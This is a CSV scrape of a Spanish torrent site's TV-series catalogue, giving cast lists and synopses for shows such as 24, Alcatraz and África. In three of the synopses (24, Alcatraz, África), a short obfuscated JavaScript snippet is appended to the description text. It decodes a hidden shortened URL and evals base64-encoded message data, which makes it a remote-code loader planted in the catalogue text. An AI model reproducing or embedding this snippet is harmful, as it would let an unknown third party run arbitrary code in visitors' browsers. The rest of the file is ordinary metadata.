Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/24/,24,"
                       Título Original: 24
Creador: Joel Surnow y Robert Cochran
Producción Ejecutiva: Joel Surnow, Robert Cochran, Ron Howard, Brian Grazer y Tony Krantz
Estudio: FOX
Género: Acción
Formato imagen: USA 16:9 / España 4:3 Fullscreen
Lugar de rodaje: Los Angeles
Sintonía: 24 Theme - Sean Callery
Horario de emisión Jueves 21:25 (doble episodio)

Temporadas: 8
Capítulos: 24

Temporadas: 9
Capítulos: 12

Reparto:
Kiefer Sutherland ... Jack Bauer
Elisha Cuthbert ... Kim Bauer
Carlos Bernard ... Tony Almeida
Dennis Haysbert ... David Palmer
Sarah Clarke ... Nina Mayers
Reiko Aylesworth  ...Michelle Dessler
Penny Johnson Jerald ... Sherry Palmer
Sarah Wynter ... Kate Warner
Leslie Hope ... Teri Bauer
James Badge Dale ... Chase Edmunds 
Mary Lynn Rajskub ... Chloe O`Brian
Xander Berkeley ... George Mason 
Lana Parrilla ... Sarah Gavin
Kim Raver ... Audrey Reines
Alberta Watson ... Erin Driscoll
Roger R. Cross ... Curtis Manning
William Devane ... James Heller
James Morrison ... Bill Buchanan
Louis Lombardi ... Edgar Stiles						","
Descripcion
Producida por Twentieth Century Fox Televisión, la serie ha batido record de audiencia y se ha consolidado como la propuesta televisiva más original de los últimos años, un producto muy bien estructurado, filmado con estilo cien por cien cinematográfico, que ofrece 24 horas de metraje trepidante, digno del mejor filme de acción.
Prueba de ellos son los premios que ha recibido hasta ahora, entre ellos un Emmy (Oscar de la televisión) al Mejor Guión, un Globo de Oro a la Mejor Serie Dramática y un Globo de Oro al Mejor Actor para su protagonista, Kiefer Sutherland. 24 cuenta con otros tres Premios Emmy en reconocimiento de la fotografía y de la música.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/ackley-bridge/,Ackley Bridge,"
                       Título original
    Ackley Bridge (TV Series) 
Año
    2017
Duración
    60 min.
País
    Reino Unido Reino Unido
Director
    Ayub Khan-Din (Creator), Kevin Erlis (Creator), Malcolm Campbell (Creator), Jon East, Robert Quinn, Penny Woolcock 
Guion
    Malcolm Campbell, Kevin Erlis, Ayub Khan-Din, Anya Reiss, Suhayla El-Bushra, Ishy Din
Música
    Tim Phillips
Fotografía
    Anna Valdez-Hanks, Sergio Delgado
Reparto
    Poppy Lee Friar, Samuel Bottomley, Amy-Leigh Hickman, Sunetra Sarker, Paul Nicholls, Liz White, Fern Deacon, Nazmeen Kauser, Sam Retford, Jo Joyner, Nohail Nazir Mohammed, Maariah Hussain, Lorraine Cheshire, Anneika Rose, Tom Varey, Adil Ray, India Parsan, Zain Khan, Kainatt Butt, Simon Lowe, Abdullah Shahid, Chris Abe, Nathan Green, Sebastian Shaw, Hassan Mahmood, Harry Myers, Arsher Ali 
Productora
    Channel 4
Género
    Serie de TV. Drama | Colegios & Universidad. Enseñanza. Racismo 						","
Descripcion
Serie ambientada en el instituto de la ficticia localidad inglesa de Yorkshire, el Ackley Bridge College. Se trata de un nuevo centro que ha nacido de la fusión de las dos escuelas preexistentes, una de ellas con mayoría de alumnos británicos, y la otra con estudiantes de origen asiático. Dos culturas, cuya convivencia no siempre es plácida, que se verán obligadas a coexistir en armonía en un centro que pondrá a prueba, a pequeña escala, la cohesión social en la Gran Bretaña post-brexit. Obligadas a fusionarse por motivos económicos, lo cierto es que todos comparten aulas, pero no por ello la comunidad está más cohesionada. Los equipos de fútbol del instituto ahora se dividen según el origen de los jugadores, e incluso dos amigas de toda la vida como Missy y Nasreen, se verán ahora a uno y otro lado de una frontera, psicológica, pero muy real. Romper con la segregación sin descuidar la enseñanza será el mayor de los retos de profesores, alumnos y padres.
"
https://www.subtorrents1.com/series/11-22-63-miniserie/,11.22.63 (Miniserie),"
                       Título original: 11/22/63
Año: 2016
País: Estados Unidos
Director: Kevin Macdonald, James Strong
Guión: Bridget Carpenter, Brian Nelson, Quinton Peeples (Novela: Stephen King)
Fotografía: Adam Suschitzky, David Katznelson
Productora: Bad Robot / Warner Bros. Television
Género: Intriga. Ciencia ficción. Thriller | Viajes en el tiempo

Capítulos: 8


Reparto:

James Franco ... Jake Epping
Chris Cooper ... Al Templeton
Josh Duhamel ... Frank Dunning
Lucy Fry ... Marina Oswald
Sarah Gadon ... Sadie
Cherry Jones ... Marguerite Oswald
T.R. Knight ... Johnny Clayton
George Mackay ... Bill Turcotte
Daniel Webber ... Oswald
Leon Rippy ... Harry Dunning
Brooklyn Sudano ... Christy						","
Descripcion
11/22/63 es una novela de Stephen King que gira en torno a un profesor de inglés de secundaria llamado Jake Epping. Jake Epping viaja en el tiempo con el objetivo de evitar el asesinato de John F. Kennedy. A lo largo de la historia, además de a Epping, se puede conocer también a Lee Harvey Oswald, el asesino del Presidente, y a su familia, su madre Marguerite y su esposa de origen ruso Marina.
Para poder llevar a cabo su aventura, Jake cuenta con la ayuda de Al Templeton, un hombre rico que facilita su travesía. Además Harry Dunning, el conserje del instituto donde trabaja Jake, marca de manera muy importante al protagonista. En la década de los 60, dos personajes interactúan con el protagonista, Bill Turcotte, un camarero que se asocia con Jake para realizar la misión; y Sadie, una camarera que se enamora de él sin conocer su secreto.
"
https://www.subtorrents1.com/series/1-contra-todos/,1 Contra Todos,"
                       Creado por Breno Silveira (2015)
Con Júlio Andrade, Julia Lanina, Adriano Garib más
País Brasil
Idioma: Portugues
Género Drama
Estado en curso
Duración 60 minutos						","
Descripcion
Cadu (Julio Andrade) es un abogado dedicado que aprecia por la verdad y la justicia por encima de todo. Con una esposa embarazada de su segundo hijo y recientemente desempleado, ve su vida cambiar completamente cuando es acusado y condenado a la prisión tras ser confundido con el mayor traficante de drogas de Brasil. En la cadena, Cadu adopta una nueva postura para poder sobrevivir y decide comportarse como el criminal que todos ya creen que es. Sin embargo, además de coleccionar enemigos, su decisión afecta drásticamente las vidas de las personas que él ama.
"
https://www.subtorrents1.com/series/46-yok-olan/,46 Yok Olan,"
                       Título original
    46 Yok Olan (TV Series) 
Año
    2016
Duración
    60 min.
País
    Turquía Turquía
Director
    Serdar Akar 
Guion
    Ercan Mehmet Erdem
Fotografía
    Volkan Aslan
Reparto
    Erdal Besikçioglu, Yasemin Kay Allen, Melis Birkan, Saygin Soysal, Berkan Sal, Metin Belgin, Ayça Eren, Selin Uludogan, Özay Fecht, Suna Yildizoglu, Mert Asutay, Bahtiyar Engin 
Productora
    Nunova Film
Género
    Serie de TV. Drama. Thriller | Crimen 						","
Descripcion
Una terrible historia de como un profesor de genética experimenta con un tratamiento para su hermana en coma, mezclando remedios médicos y chamánicos, pero desata un efecto secundario inesperado.
"
https://www.subtorrents1.com/series/3/,3 %,"
                       Título original: 3%
Año: 2016
País: Brasil
Director: Jotagá Crema, Daina Giannecchini, Dani Libardi, César Charlone
Guión: Pedro Aguilera
Productora: Boutique Filmes / Netflix
Género: Ciencia ficción. Thriller

Capítulos: 8


Reparto:

João Miguel ... Ezequiel
Bianca Comparato ... Michele
Michel Gomes ... Fernando
Rodolfo Valente ... Rafael
Vaneza Oliveira ... Joana
Viviane Porto ...Aline						","
Descripcion
Ambientada en Brasil, en un futuro no muy lejano, la serie muestra una realidad completamente distinta a la que conocemos. La sociedad ha ido evolucionando hasta que al final ha quedado dividida entre la tecnología y la devastación. Sus ciudadanos se ven obligados a luchar para formar parte del lado de los privilegiados y evitar, de esta forma, caer en la devastación. Así, son sometidos a un duro y despiadado proceso en el que tendrán que competir entre sí para lograr ser los mejores y poder escapar de su miserable vida. ¿El problema? Solo el 3% de la población lo consigue.
"
https://www.subtorrents1.com/series/ad-vitam/,Ad Vitam,"
                       Titulo Original: Ad Vitam 
Titulo Español: Ad Vitam 
Año: 2019 
Genero: Drama, Ciencia Ficcion 
Promedio De Duracion: 52 Minutos 
Pais: Francia
Clasificacion: Mayores de 12 Años 						","
Descripcion
Ad Vitam es un thriller de ciencia ficción francés ambientado en un futuro distópico en el que las personas pueden vivir eternamente, Lo protagonizan Darius, un policía de 120 años y Christa, una investigadora de 24. Su intrigante aventura comienza cuando investigan un suicidio de siete adolescentes que les lleva por un mundo de alternativas, conspiraciones y decisiones de vida o muerte.
"
https://www.subtorrents1.com/series/1993/,1993,"
                       Título original
    1993 (TV Series)
Año
    2017
Duración
    60 min.
País
    Italia
Director
    Alessandro Fabbri (Creator), Ludovica Rampoldi (Creator), Stefano Sardo (Creator), Giuseppe Gagliardi
Guion
    Alessandro Fabbri, Nicola Lusuardi, Ludovica Rampoldi, Stefano Sardo
Música
    Davide Dileo
Fotografía
    Michele Paradisi
Reparto
    Stefano Accorsi, Guido Caprino, Miriam Leone, Domenico Diele, Tea Falco, Antonio Gerardi, Ambrogio Avogadri, Giulio Brogi, Gaetano Bruno, Laura Chiatti, Irene Casagrande, Elena Radonicich, Paolo Pierobon, Teco Celio, Vinicio Marchioni, Gianfelice Imparato
Productora
    Sky / Wildside
Género
    Serie de TV. Drama. Thriller | Años 90. Mafia. Política. Crimen. Secuela						","
Descripcion
Secuela de la serie ""1992"". La serie sigue las vivencias de los personajes donde las dejó su precuela, teniendo como trasfondo los principales eventos que marcaron la vida pública italiana durante el año que da nombre a la serie: el proceso ENIMONT, la caida política de Bettino Craxi y del Partido Socialista Italiano, los atentados mafiosos en Florencia, Roma y Milán, los referéndums abrogativos, el final de la Primera República y la entrada en política de Silvio Berlusconi.
"
https://www.subtorrents1.com/series/al-hayba/,Al Hayba,"
                       Al Hayba impactó de manera positiva en rating en 12 países de Medio Oriente y África del Norte (MENA), donde obtuvo los shares más importantes entre los 50 dramas emitidos durante Ramadan, según cifras de GFK, MMS, y fue la serie más trending en los 30 días.						","
Descripcion
Hadad: 'Tuvo un comportamiento social increíble en las comunidades árabes, pero también en Canadá, por ejemplo. Un verdadero fenómeno que atraviesa fronteras. Una de las razones ha sido la selección del cast/personalidades y la historia que se desarrolla en la villa que lleva el nombre de la serie, localizada entre Siria y Líbano'.
Los televidentes simpatizaron y se enamoraron de la tribu Sheikh El Jabal. 'Es una producción que muestra una mezcla de mafia con momentos de suspenso y un giro inteligente, con romance y códigos de amor',
"
https://www.subtorrents1.com/series/alcatraz/,Alcatraz,"
                       Título Original: Alcatraz
Creador: Elizabeth Sarnoff, Steven Lilien y Bryan Wynbrandt
Producción Ejecutiva: J.J. Abrams, Elizabeth Sarnoff, Steven Lilien y Bryan Wynbrandt
Estudio: Warner Bros. Television
Género: Acción
Temporada: 1ª 
Episodios: 13
Fecha de estreno: 16 de enero de 2012
Lugar de rodaje: Vancouver y San Francisco (California)
Distribución: Warner
Horario de emisión: Lunes 9.00 p.m.

Reparto:
Sarah Jones ... Rebecca Madsen
Jorge Garcia ... Diego Soto
Sam Neill ... Emerson Hauser
Parminder Nagra ... Lucy Banerjee
Santiago Cabrera ... Jimmy Dickens
Jonny Coyne ... Edwin James
Jason Butler Harner ... E.B. Tiller
Robert Forster ... Ray Archer
","
Descripcion
De los productores ejecutivos J.J. Abrams (Fringe) y Elizabeth Sarnoff (Perdidos) llega Alcatraz, una serie de suspense centrada en la más infame prisión de América, que en el pasado, fue el hogar de los asesinos, violadores, secuestradores y ladrones más peligrosos del país. En ella, una detective de San Francisco es asignada a investigar un asesinato y descubre que el principal sospechoso del caso es un antiguo preso de Alcatraz que ha estado muerto desde hace décadas. Y es que poco a poco saldrá a la luz que un grupo de prisioneros y guardias de esta conocida prisión que desaparecieron de forma misteriosa hace treinta años, están empezando a reaparecer en el presente.
Cuando la detective Rebecca Madsen (Sarah Jones, Sons of Anarchy), de la Policía de San Francisco, es asignada a un complicado caso de homicidio, una huella le lleva a un sorprendente sospechoso, un ex-preso de Alcatraz que murió hace décadas. Debido a su historia familiar, su abuelo y su tío, Ray Archer (Robert Forster, Jackie Brown), fueron guardias de esa prisión, Rebecca muestra un gran interés en el caso, y una vez que descubre que el enigmático y silencioso Emerson Hauser (Sam Neill, Los Tudor), un agente del Gobierno, trata de impedir su investigación, su compromiso con el caso se hace incluso mucho más grande. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/africa/,África,"
                       Africa
Classification: Documentary
Genre: Adventure | Wildlife
Status: New Series
Network: BBC One ( United Kingdom)
Airs: Wednesdays at 09:00 pm
Runtime: 60 Minutes
Premiere: January 02, 2013
Episode Order: 7
País: Reino Unido
Idioma: Inglés 						","
Descripcion
Cara a cara con lo desconocido – continente más salvaje del mundo. David Attenborough lleva a un impresionante viaje a través del continente vasto y diverso de África, ya que nunca se ha visto antes.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/all-or-nothing-new-zealand-all-blacks/,All or Nothing: New Zealand All Blacks,"
                       Al comienzo de la serie, el equipo se enfrenta al arduo camino por recorrer, después de que sus veteranos superestrellas se retiraron. Con el orgullo de Nueva Zelanda sobre sus hombros, tendrán que unirse para encarar las exigencias físicas del rugby, el ojo crítico de sus fans y los medios, y los retos de la familia y la paternidad, todo mientras luchan por mantener un legado de un siglo en el dominio del deporte. 						","
Descripcion
La temporada de seis episodios, narrada por Taika Waititi, pone a un equipo de grabación junto al equipo de rugby de Nueva Zelanda, los All Blacks, uno de los equipos más exitosos en la historia global del deporte. Por primera vez, los legendarios All Blacks permiten que se les unan cámaras mientras encaran a los formidables leones británicos e irlandeses en un enfrentamiento que ocurre una vez cada 12 años, mientras compiten por el Campeonato 2017 de rugby. La serie ofrece acceso exclusivo a uno de los equipos más dominantes del planeta durante su temporada más discutida y difícil, llevando al público a los vestidores, al campo, y a las vidas del entrenador Steve Hansen y de los aclamados jugadores.
"
